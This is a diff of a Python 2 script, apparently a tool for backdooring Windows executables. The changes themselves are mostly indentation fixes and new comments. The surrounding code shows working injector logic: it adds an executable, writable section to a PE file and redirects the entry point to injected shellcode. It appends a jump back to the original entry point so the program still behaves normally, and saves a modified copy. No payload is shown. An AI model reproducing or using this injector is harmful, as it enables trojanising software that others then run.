@@ -59,47 +59,48 @@ def addSection(path,shellcode):
     section_alignment = pe.OPTIONAL_HEADER.SectionAlignment
     new_section_offset = (pe.sections[number_of_section - 1].get_file_offset() + 40)
 
-	# Look for valid values for the new section header
+    # Look for valid values for the new section header
     raw_size = align(0x1000, file_alignment)
     virtual_size = align(0x1000, section_alignment)
     raw_offset = align((pe.sections[last_section].PointerToRawData + pe.sections[last_section].SizeOfRawData),file_alignment)
 
     virtual_offset = align((pe.sections[last_section].VirtualAddress + pe.sections[last_section].Misc_VirtualSize),section_alignment)
 
-	# CODE | EXECUTE | READ | WRITE
+    # CODE | EXECUTE | READ | WRITE
     characteristics = 0xE0000020
-	# Section name must be equal to 8 bytes
+    # Section name must be equal to 8 bytes
     name = ".axc" + (4 * '\x00')
 
-	# Create the section
-	# Set the name
+    # Create the section
+    # Set the name
     pe.set_bytes_at_offset(new_section_offset, name)
     print "\t[+] Section Name = %s" % name
-	# Set the virtual size
+    # Set the virtual size
     pe.set_dword_at_offset(new_section_offset + 8, virtual_size)
     print "\t[+] Virtual Size = %s" % hex(virtual_size)
-	# Set the virtual offset
+    # Set the virtual offset
     pe.set_dword_at_offset(new_section_offset + 12, virtual_offset)
     print "\t[+] Virtual Offset = %s" % hex(virtual_offset)
-	# Set the raw size
+    # Set the raw size
     pe.set_dword_at_offset(new_section_offset + 16, raw_size)
     print "\t[+] Raw Size = %s" % hex(raw_size)
-	# Set the raw offset
+    # Set the raw offset
     pe.set_dword_at_offset(new_section_offset + 20, raw_offset)
     print "\t[+] Raw Offset = %s" % hex(raw_offset)
-	# Set the following fields to zero
+    # Set the following fields to zero
     pe.set_bytes_at_offset(new_section_offset + 24, (12 * '\x00'))
-	# Set the characteristics
+    # Set the characteristics
     pe.set_dword_at_offset(new_section_offset + 36, characteristics)
     print "\t[+] Characteristics = %s\n" % hex(characteristics)
 
-	# STEP 0x03 - Modify the Main Headers
+    # STEP 0x03 - Modify the Main Headers
     print "[*] STEP 0x03 - Modify the Main Headers"
     pe.FILE_HEADER.NumberOfSections += 1
     print "\t[+] Number of Sections = %s" % pe.FILE_HEADER.NumberOfSections
     pe.OPTIONAL_HEADER.SizeOfImage = virtual_size + virtual_offset
     print "\t[+] Size of Image = %d bytes" % pe.OPTIONAL_HEADER.SizeOfImage
-	
+
+    # Change path of PE file
     exe_path = path.split('.exe')
     path = exe_path[0] + "change.exe"
     pe.write(path)
@@ -111,22 +112,22 @@ def addSection(path,shellcode):
 	
     print "\t[+] New Entry Point = %s" % hex(pe.sections[last_section].VirtualAddress)
     oep = pe.OPTIONAL_HEADER.AddressOfEntryPoint 
-	
+
+    # Add new Entry Point to shellcode
     o_oep = "%08x" % (oep+0x400000)
     o_oep = "".join(reversed([o_oep[i:i+2] for i in range(0, len(o_oep), 2)]))
     o_oep = o_oep + "ffd0"
     o_oep = unhexlify(o_oep)
     shellcode = shellcode + o_oep
-	#print(shellcode)
+    #print(shellcode)
 
     print "\t[+] Original Entry Point = %s\n" % hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
     pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_ep
-	#print("entrypoint: "+hex(oep))
+    #print("entrypoint: "+hex(oep))
 	
     print "\t"
     print(path)
-
-	# STEP 0x04 - Inject the Shellcode in the New Section
+    # STEP 0x04 - Inject the Shellcode in the New Section
     print "[*] STEP 0x04 - Inject the Shellcode in the New Section"
 
     raw_offset = pe.sections[last_section].PointerToRawData
